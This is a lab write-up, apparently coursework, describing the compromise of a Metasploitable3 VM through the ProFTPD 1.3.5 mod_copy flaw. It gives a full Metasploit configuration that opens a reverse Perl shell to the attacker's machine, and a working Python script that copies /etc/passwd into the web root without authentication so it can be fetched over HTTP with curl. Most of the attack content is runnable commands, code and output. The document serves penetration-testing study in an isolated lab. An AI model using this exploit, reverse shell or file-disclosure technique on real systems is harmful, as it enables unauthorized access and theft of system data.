# Phase 1: Service Compromise
---

##  Task 1.1: Exploiting the Service Using Metasploit

---
##  Step 1: Environment Setup

- **Victim VM**: Metasploitable3
- **Attacker VM**: Kali Linux
- **Network Type**: Host-Only
- **Victim IP**: 192.168.168.129
- **Tool Used**: Metasploit
- **Vulnerable Service To Exploit**: FTP

##  Step 2: Service Enumeration using Nmap

An Nmap scan was performed to identify open services on the victim machine.

### Command:

```bash
nmap -sV 192.168.168.129
```

The scan revealed several open ports, including FTP (ProFTPD 1.3.5) on port 21, which was chosen as the target for this phase.

##  Step 3: Identifying the Vulnerable FTP Service

After discovering that port 21 was open and running **ProFTPD 1.3.5**, Metasploit was used to search for known exploits targeting this specific version of the FTP service.

### üîß Metasploit Search Command:

```bash
search proftpd type:exploit
```

This returned several results. Among them, the following module was selected as the most suitable for our target:

Module: exploit/unix/ftp/proftpd_modcopy_exec

Rank: Excellent

Description: This exploit leverages the SITE CPFR/CPTO commands provided by the ProFTPD mod_copy module (enabled by default in 1.3.5). It allows remote attackers to copy a malicious PHP file into the web server directory, which can then be executed to obtain a reverse shell.

The danger of this vulnerability lies in the ability to move or duplicate files to web-accessible locations **without requiring any authentication or user permissions**. This allows attackers to expose sensitive files or upload backdoors (e.g., web shells) that can be triggered through the browser, bypassing typical access controls and defenses.

##  Step 4: Exploitation via Metasploit

The following commands were used to exploit the FTP service:

## üîß Exploit Configuration

1. **Set the Exploit Module:**

    ```bash
    use exploit/unix/ftp/proftpd_modcopy_exec
    ```

2. **Set the Target Host:**

    ```bash
    set RHOSTS 192.168.168.129
    ```

3. **Set the FTP Port (default 21):**

    ```bash
    set RPORT 21
    ```

4. **Set the Site Path (Web Root):**

    ```bash
    set SITEPATH /var/www/html
    ```

5. **Set the Payload:**

    ```bash
    set payload cmd/unix/reverse_perl
    ```

6. **Set the Attacker's IP (LHOST):**

    ```bash
    set LHOST 192.168.168.128
    ```

7. **Launch the Exploit:**

    ```bash
    exploit
    ```


Result:
* The exploit successfully copied a malicious PHP payload into the web server's root directory.
* Triggering the payload resulted in a reverse shell being established on the attacker's machine.

### Post-Exploitation Verification

Once the reverse shell was successfully established, the following commands were executed to confirm the current access level and working directory:

1. **Check the current user:**
    ```bash
    whoami
    ```

2. **Check the present working directory:**
    ```bash
    pwd
    ```
3. **Check the network configuration:**
    ```bash
    ifconfig
    ```
**Result:**
- **User:** `www-data`
- **Directory:** `/var/www/html`
- **Network Configuration::** eth0      Link encap:Ethernet  HWaddr 00:0c:29:c3:36:e6
          inet addr:192.168.168.129  Bcast:192.168.168.255  Mask:255.255.255.0

## üîß Task 1.2: Custom Script Exploitation (ProFTPD mod_copy)

For this task, a **custom Python script** was created to exploit the same FTP vulnerability (ProFTPD 1.3.5 `mod_copy`) manually ‚Äî without using Metasploit.

### üîç Technical Background

The **ProFTPD 1.3.5** service has a module called `mod_copy` enabled by default. This module introduces two FTP commands:

- `SITE CPFR <file>`: Marks a file to be copied (‚ÄúCopy From‚Äù).
- `SITE CPTO <dest>`: Copies the previously marked file to the destination (‚ÄúCopy To‚Äù).

These commands are processed **without authentication**, meaning an attacker can arbitrarily copy any readable file on the system. This behavior is due to the way the mod_copy module handles file operations internally. It does not enforce user-level permissions for these actions, which violates the principle of least privilege. As a result, even unauthenticated users can copy sensitive files.


In our custom exploit, we used these commands to copy the system password file `/etc/passwd` to the web root folder `/var/www/html/copy.txt`, which allowed us to retrieve it later over HTTP.

- `/etc/passwd` contains a list of all system users and is readable by anyone.
- `/var/www/html` is the default public web directory for Apache in Ubuntu (confirmed running on port 80 via Nmap).

This technique simulates **real-world unauthorized disclosure of sensitive system files** via a misconfigured FTP service.

### üéØ Objective

Use `SITE CPFR` and `SITE CPTO` FTP commands to copy sensitive system files (e.g., `/etc/passwd`) to a web-accessible directory (`/var/www/html`) and verify access as a proof-of-concept.

### üß† Custom Exploit Script

```python
from ftplib import FTP

target_ip = "192.168.168.129"
ftp_port = 21
source_file = "/etc/passwd"
target_file = "/var/www/html/copy.txt"

try:
    print(f"[+] Connecting to FTP on {target_ip}...")
    ftp = FTP()
    ftp.connect(target_ip, ftp_port)

    print("[+] Sending SITE CPFR and CPTO commands...")
    ftp.sendcmd(f"SITE CPFR {source_file}")
    ftp.sendcmd(f"SITE CPTO {target_file}")
    
    print(f"[+] Successfully copied {source_file} to {target_file}!")
    ftp.quit()
except Exception as e:
    print(f"[-] Exploit failed: {e}")
```
### üñ•Ô∏è Script Execution
To execute the custom exploit script from the terminal, the following command was run:

**Command:**

```bash
 python3 ftp_modcopy_exploit.py
```
###  Result Output
The script output confirmed that the exploit was successful:
[+] Connecting to FTP on 192.168.168.129...
[+] Sending SITE CPFR and CPTO commands...
[+] Successfully copied /etc/passwd to /var/www/html/copy.txt!
![Execution Result](./custom_script_screenshots/Execution_Result.png)

### üîç Proof of Concept: Accessing the Copied File

To validate that the `/etc/passwd` file was successfully copied to the web-accessible directory, the following command was used from the attacker's machine:

**Command:**

`curl http://192.168.168.129/copy.txt`

---

### üìÑ Retrieved Output

This command returned the contents of the `/etc/passwd` file, confirming the success of the exploit. The file contains a list of all system users.



![Proof of Concept - curl copy.txt](./custom_script_screenshots/passwd_poc.png)

This file lists all system users and their associated metadata (such as user IDs, home directories, and login shells). While the password fields are typically stored in `/etc/shadow`, the `/etc/passwd` file is still highly valuable to attackers because it:

- Confirms the exploit worked and the file was copied without authentication
- Leaks valid usernames (e.g., `root`, `msfadmin`, `vagrant`, `www-data`)
- Enables user enumeration for future privilege escalation or brute-force attempts

---

###  Conclusion

This demonstrates that a custom Python script ‚Äî without using Metasploit ‚Äî can exploit the ProFTPD mod_copy vulnerability to:

- Copy sensitive files from the target (e.g., `/etc/passwd`)
- Serve them publicly via HTTP (`/var/www/html`)
- Retrieve them remotely, confirming the vulnerability

This completes **Task 1.2**.
